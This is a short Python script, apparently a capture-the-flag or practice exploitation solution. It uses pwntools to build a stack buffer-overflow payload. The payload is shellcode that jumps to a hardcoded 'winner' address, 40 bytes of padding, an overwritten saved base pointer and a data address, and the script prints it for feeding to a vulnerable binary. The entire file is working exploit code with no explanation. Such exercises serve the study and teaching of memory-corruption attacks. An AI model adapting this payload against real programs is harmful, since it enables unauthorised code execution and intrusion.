from pwnlib import shellcraft, asm, context
import struct
from pwn import pack


#DATA_ADDR = 0x00007fffffef6030
DATA_ADDR = "\x30\x40\xef\xf7\xff\x7f\x00\x00" # 0x7fffffef6030
RBP = 0x7fffffffe3f8
WINNER_ADDR = 0x400af3

context.arch = 'amd64'
shellcode = shellcraft.amd64.push(WINNER_ADDR)
shellcode += shellcraft.amd64.ret()

shellcode = asm.asm(shellcode, arch='amd64')

buf = shellcode + "A" * (40 - len(shellcode))
buf += struct.pack("<Q", RBP)
buf += " "
buf += DATA_ADDR

print buf